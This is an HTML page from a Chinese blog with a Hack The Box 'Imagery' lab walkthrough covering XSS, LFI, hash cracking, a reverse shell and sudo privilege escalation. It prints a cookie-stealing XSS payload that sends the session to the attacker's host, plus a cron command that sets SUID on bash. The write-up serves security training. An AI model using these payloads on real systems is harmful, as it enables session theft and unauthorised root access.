@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="Hu9Do8Tx47t851t8Rdk0NlwZL3UeW0wOkTbVzqLFU9w">
+  <meta name="msvalidate.01" content="A35AD8AE43092D6BAF78D36FAC56B4DD">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ry0ma24.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content=".tnwholodlwip{zoom:50%;}">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Imagery">
+<meta property="og:url" content="https://ry0ma24.github.io/posts/3872553c.html">
+<meta property="og:site_name" content="相忘于江湖">
+<meta property="og:description" content=".tnwholodlwip{zoom:50%;}">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/undefined/image-20251004154017644.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/undefined/image-20251004130342070.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/undefined/image-20251004162611620.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/undefined/image-20251004163012387.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/undefined/image-20251004125240172.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/undefined/image-20251004125550662.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/undefined/image-20251004125715053.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/undefined/image-20251004165324958.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/undefined/image-20251004132834759.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/undefined/image-20251004132313763.png">
+<meta property="article:published_time" content="2025-10-04T07:42:00.000Z">
+<meta property="article:modified_time" content="2025-10-04T09:33:08.209Z">
+<meta property="article:author" content="Ry0ma24">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ry0ma24.github.io/posts/undefined/image-20251004154017644.png">
+
+
+<link rel="canonical" href="https://ry0ma24.github.io/posts/3872553c.html">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ry0ma24.github.io/posts/3872553c.html","path":"posts/3872553c.html","title":"HTB-Imagery"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HTB-Imagery | 相忘于江湖</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="相忘于江湖" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">相忘于江湖</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人生天地之间，若白驹之过隙，忽然而已</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap-Scan"><span class="nav-number">1.</span> <span class="nav-text">Nmap Scan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">2.</span> <span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LFI"><span class="nav-number">3.</span> <span class="nav-text">LFI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE"><span class="nav-number">4.</span> <span class="nav-text">RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">5.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">6.</span> <span class="nav-text">权限提升</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ry0ma24"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ry0ma24</p>
+  <div class="site-description" itemprop="description">好好活动，好好学习，好好游戏，好好吃饭，好好休息，要过一个开心有趣，精神百倍的人生</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lvdXJuYW1l" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOnlvdXJuYW1lQGdtYWlsLmNvbQ==" title="E-Mail → mailto:yourname@gmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ry0ma24.github.io/posts/3872553c.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ry0ma24">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="相忘于江湖">
+      <meta itemprop="description" content="好好活动，好好学习，好好游戏，好好吃饭，好好休息，要过一个开心有趣，精神百倍的人生">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HTB-Imagery | 相忘于江湖">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB-Imagery
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-10-04 15:42:00 / 修改时间：17:33:08" itemprop="dateCreated datePublished" datetime="2025-10-04T15:42:00+08:00">2025-10-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Hackthebox/" itemprop="url" rel="index"><span itemprop="name">Hackthebox</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><style>.tnwholodlwip{zoom:50%;}</style><img src="/posts/undefined/image-20251004154017644.png" class="tnwholodlwip" alt="HTB-Imagery">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Linux</td>
+<td>Medium</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.11.88  <span class="token parameter variable">-sV</span> --min-rate <span class="token number">1000</span>                                                                       
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-10-04 <span class="token number">10</span>:43 CST
+Warning: <span class="token number">10.10</span>.11.88 giving up on port because retransmission cap hit <span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>.
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.11.88
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.085s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">995</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>
+PORT     STATE    SERVICE     VERSION
+<span class="token number">22</span>/tcp   <span class="token function">open</span>     <span class="token function">ssh</span>         OpenSSH <span class="token number">9</span>.7p1 Ubuntu 7ubuntu4.3 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token number">800</span>/tcp  filtered mdbs_daemon
+<span class="token number">1840</span>/tcp filtered netopia-vo2
+<span class="token number">8000</span>/tcp <span class="token function">open</span>     http-alt    Werkzeug/3.1.3 Python/3.12.7
+<span class="token number">9000</span>/tcp <span class="token function">open</span>     http        SimpleHTTPServer <span class="token number">0.6</span> <span class="token punctuation">(</span>Python <span class="token number">3.12</span>.7<span class="token punctuation">)</span>
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">106.94</span> seconds</code></pre>
+
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>访问8000端口，注册新账号并登录，点击“Report Bug”<img src="/posts/undefined/image-20251004130342070.png" class="" title="register"></p>
+<img src="/posts/undefined/image-20251004162611620.png" class="" title="Reportbug">
+
+<p>输入payload ：<code>&lt;img src=x onerror=&quot;document.location=&#39;http://10.10.16.4:8000/&#39;+document.cookie&quot;&gt;</code>，然后提交</p>
+<img src="/posts/undefined/image-20251004163012387.png" class="" title="xss">
+
+<p>本地接收到cookie</p>
+<pre class="language-none"><code class="language-none">$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http:&#x2F;&#x2F;0.0.0.0:8000&#x2F;) ...
+10.10.11.88 - - [04&#x2F;Oct&#x2F;2025 11:24:46] code 404, message File not found
+10.10.11.88 - - [04&#x2F;Oct&#x2F;2025 11:24:46] &quot;GET &#x2F;session&#x3D;.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOCNPw.MCFvc7DFwoC1SmjGMT5gr8Owsxo HTTP&#x2F;1.1&quot; 404 -
+10.10.11.88 - - [04&#x2F;Oct&#x2F;2025 11:24:46] code 404, message File not found</code></pre>
+
+<p>点击F12, 将cookie替换成xss 获取到的cookie，刷新页面出现’Admin Panel’</p>
+<img src="/posts/undefined/image-20251004125240172.png" class="" title="替换cookie">
+
+<h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>点击 <code>Download Log</code> 抓包，参数 <code>log_identifier</code> 存在本地文件包含漏洞</p>
+<img src="/posts/undefined/image-20251004125550662.png" class="" title="admin panel">
+
+<p>访问..&#x2F;db.json</p>
+<img src="/posts/undefined/image-20251004125715053.png" class="" title="burp">
+
+<p>将获取的密码 hash 进行破解</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ hashcat <span class="token builtin class-name">hash</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">0</span>  /opt/secLists/rockyou.txt  
+hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting
+<span class="token operator">&lt;</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">></span>
+Host memory required <span class="token keyword">for</span> this attack: <span class="token number">4</span> MB
+
+Dictionary cache hit:
+* Filename<span class="token punctuation">..</span>: /opt/secLists/rockyou.txt
+* Passwords.: <span class="token number">14344384</span>
+* Bytes<span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">139921497</span>
+* Keyspace<span class="token punctuation">..</span>: <span class="token number">14344384</span>
+
+2c65c8d7bfbca32a3ed42596192384f6:iambatman                                                                </code></pre>
+
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>使用账号<span class="exturl" data-url="bWFpbHRvOiYjMTE2OyYjeDY1OyYjeDczOyYjMTE2OyYjeDc1OyYjMTE1OyYjeDY1OyYjeDcyOyYjeDQwOyYjeDY5OyYjMTA5OyYjOTc7JiMxMDM7JiN4NjU7JiN4NzI7JiN4Nzk7JiM0NjsmIzEwNDsmI3g3NDsmI3g2Mjs=">testuser@imagery.htb<i class="fa fa-external-link-alt"></i></span> 和破解出的密码登录目标站点，随便上传一张图片，点击<code>Transform Image</code> </p>
+<img src="/posts/undefined/image-20251004165324958.png" class="" title="Transform image">
+
+<p>选择Crop，点击<code>Apply Transformation</code> , 抓包修改参数 <code>y</code> </p>
+<img src="/posts/undefined/image-20251004132834759.png" class="" title="Crop">
+
+<img src="/posts/undefined/image-20251004132313763.png" class="" title="burp">
+
+<p>反弹shell成功</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">7777</span>                        
+Listening on <span class="token number">0.0</span>.0.0 <span class="token number">7777</span>
+Connection received on <span class="token number">10.10</span>.11.88 <span class="token number">60086</span>
+web@Imagery:~/web$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>web<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>web<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>web<span class="token punctuation">)</span>
+</code></pre>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>在&#x2F;var&#x2F;backup 目录下有个web_20250806_120723.zip.aes 文件，使用file 命令查看信息，发现是pyAesCrypt 加密的文件</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">web@Imagery:/var/backup$ <span class="token function">ls</span>
+web_20250806_120723.zip.aes
+$ <span class="token function">file</span> web_20250806_120723.zip.aes 
+web_20250806_120723.zip.aes: AES encrypted data, version <span class="token number">2</span>, created by <span class="token string">"pyAesCrypt 6.1.1"</span></code></pre>
+
+<p>下载文件并使用脚本对文件进行破解，将压缩包中的db.json 密码hash提取出来破解</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ python3 pyAesCrack.py <span class="token parameter variable">-e</span> web.zip.aes <span class="token parameter variable">-w</span> pass.txt <span class="token parameter variable">-o</span> web.zip <span class="token parameter variable">-p</span> <span class="token number">4</span>                
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Working dir: /tmp/pyaescrack_work_zft_yh_i
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Using <span class="token number">4</span> worker<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, <span class="token assign-left variable">bufferSize</span><span class="token operator">=</span><span class="token number">65536</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Password found: <span class="token string">'bestfriends'</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Decrypted <span class="token function">file</span> saved to: web.zip</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ hashcat <span class="token builtin class-name">hash</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">0</span>  /opt/secLists/rockyou.txt                             
+hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting
+<span class="token operator">&lt;</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">></span>
+Dictionary cache hit:
+* Filename<span class="token punctuation">..</span>: /opt/secLists/rockyou.txt
+* Passwords.: <span class="token number">14344384</span>
+* Bytes<span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">139921497</span>
+* Keyspace<span class="token punctuation">..</span>: <span class="token number">14344384</span>
+
+01c3d2e5bdaf6134cec0a367cf53e535:supersmash               </code></pre>
+
+<p>切换mark 用户</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">web@Imagery:~/web$ <span class="token function">su</span> mark
+Password: supersmash
+mark@Imagery:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>mark<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>mark<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>mark<span class="token punctuation">)</span></code></pre>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看sudo 配置文件，发现<code>/usr/local/bin/charcol</code> 并且支持交互式shell</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mark@Imagery:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> mark on Imagery:
+    env_reset, mail_badpass,
+    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin,
+    use_pty
+
+User mark may run the following commands on Imagery:
+    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /usr/local/bin/charcol
+    
+mark@Imagery:~$ <span class="token function">sudo</span> /usr/local/bin/charcol <span class="token parameter variable">-h</span>
+usage: charcol.py <span class="token punctuation">[</span>--quiet<span class="token punctuation">]</span> <span class="token punctuation">[</span>-R<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>shell,help<span class="token punctuation">&#125;</span> <span class="token punctuation">..</span>.
+
+Charcol: A CLI tool to create encrypted backup <span class="token function">zip</span> files.
+
+positional arguments:
+  <span class="token punctuation">&#123;</span>shell,help<span class="token punctuation">&#125;</span>          Available commands
+    shell               Enter an interactive Charcol shell.
+    <span class="token builtin class-name">help</span>                Show <span class="token builtin class-name">help</span> message <span class="token keyword">for</span> Charcol or a specific command.
+
+options:
+  <span class="token parameter variable">--quiet</span>               Suppress all informational output, showing only
+                        warnings and errors.
+  -R, --reset-password-to-default
+                        Reset application password to default <span class="token punctuation">(</span>requires system
+                        password verification<span class="token punctuation">)</span>.
+</code></pre>
+
+<p>使用charcol shell结合cron job进行提权，payload：<code>auto add --schedule &quot;* * * * *&quot; --command &quot;chmod 4755 /usr/bin/bash&quot; --name &quot;Set SUID Bash&quot; --log-output &quot;/home/mark/log.txt&quot;</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mark@Imagery:~$ <span class="token function">sudo</span> /usr/local/bin/charcol shell
+
+  ░██████  ░██                                                  ░██ 
+ ░██   ░░██ ░██                                                  ░██ 
+░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
+░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
+░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
+ ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
+  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
+                                                                    
+                                                                    
+                                                                    
+Charcol The Backup Suit - Development edition <span class="token number">1.0</span>.0
+
+<span class="token punctuation">[</span><span class="token number">2025</span>-10-04 06:52:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Entering Charcol interactive shell. Type <span class="token string">'help'</span> <span class="token keyword">for</span> commands, <span class="token string">'exit'</span> to quit.
+charcol<span class="token operator">></span> auto <span class="token function">add</span> <span class="token parameter variable">--schedule</span> <span class="token string">"* * * * *"</span> <span class="token parameter variable">--command</span> <span class="token string">"chmod 4755 /usr/bin/bash"</span> <span class="token parameter variable">--name</span> <span class="token string">"Set SUID Bash"</span> --log-output <span class="token string">"/home/mark/log.txt"</span> 
+<span class="token operator">&lt;</span> <span class="token string">"Set SUID Bash"</span> --log-output <span class="token string">"/home/mark/log.txt"</span> 
+<span class="token punctuation">[</span><span class="token number">2025</span>-10-04 06:52:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> System password verification required <span class="token keyword">for</span> this operation.
+Enter system password <span class="token keyword">for</span> user <span class="token string">'mark'</span> to confirm: 
+<span class="token punctuation">[</span><span class="token number">2025</span>-10-04 06:52:58<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> System password verified successfully.
+<span class="token punctuation">[</span><span class="token number">2025</span>-10-04 06:52:58<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Auto job <span class="token string">'Set SUID Bash'</span> <span class="token punctuation">(</span>ID: 0103686f-60a3-4118-b422-72f18fa31b01<span class="token punctuation">)</span> added successfully. The job will run according to schedule.
+<span class="token punctuation">[</span><span class="token number">2025</span>-10-04 06:52:58<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Cron line added: * * * * * <span class="token assign-left variable">CHARCOL_NON_INTERACTIVE</span><span class="token operator">=</span>true <span class="token function">chmod</span> <span class="token number">4755</span> /usr/bin/bash <span class="token operator">>></span> /home/mark/log.txt <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>
+charcol<span class="token operator">></span> <span class="token builtin class-name">exit</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-10-04 06:53:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Exiting Charcol shell.
+mark@Imagery:~$ /usr/bin/bash <span class="token parameter variable">-p</span> 
+bash-5.2<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>mark<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>mark<span class="token punctuation">)</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>mark<span class="token punctuation">)</span>
+bash-5.2<span class="token comment"># whoami</span>
+root</code></pre>
+
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>flag1</td>
+<td>&#x2F;home&#x2F;mark&#x2F;user.txt</td>
+</tr>
+<tr>
+<td>flag2</td>
+<td>&#x2F;root&#x2F;root.txt</td>
+</tr>
+</tbody></table>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/XSS/" rel="tag"># XSS</a>
+              <a href="/tags/LFI/" rel="tag"># LFI</a>
+              <a href="/tags/RCE/" rel="tag"># RCE</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/84373dcc.html" rel="prev" title="HTB-Expressway">
+                  <i class="fa fa-angle-left"></i> HTB-Expressway
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
